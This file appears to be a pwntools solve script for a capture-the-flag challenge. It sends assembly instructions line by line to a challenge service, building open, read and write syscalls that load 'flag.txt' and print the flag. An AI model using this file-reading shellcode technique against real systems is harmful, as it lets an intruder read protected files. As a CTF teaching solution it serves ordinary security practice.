from pwn import *

if args.REMOTE:
    p = remote("localhost", 34568)
else:
    p = process(["python3", "chall.py"])

p.sendlineafter(b"asm>", b"mov rsi, rsp")
p.sendlineafter(b"asm>", b"mov rdx, 0x100")
p.sendlineafter(b"asm>", b"syscall")
p.sendlineafter(b"INPUT]", b"flag.txt")

p.sendlineafter(b"asm>", b"mov rax, 2")
p.sendlineafter(b"asm>", b"mov rdi, rsp")
p.sendlineafter(b"asm>", b"mov rsi, 0")
p.sendlineafter(b"asm>", b"mov rdx, 0")
p.sendlineafter(b"asm>", b"syscall")

p.sendlineafter(b"asm>", b"mov rax, 0")
p.sendlineafter(b"asm>", b"mov rdi, 3")
p.sendlineafter(b"asm>", b"mov rsi, rsp")
p.sendlineafter(b"asm>", b"mov rdx, 0x100")
p.sendlineafter(b"asm>", b"syscall")

p.sendlineafter(b"asm>", b"mov rax, 1")
p.sendlineafter(b"asm>", b"mov rdi, 1")
p.sendlineafter(b"asm>", b"mov rsi, rsp")
p.sendlineafter(b"asm>", b"mov rdx, 0x100")
p.sendlineafter(b"asm>", b"syscall")

p.recvuntil(b"grey")
print("grey"+p.recvlineS())
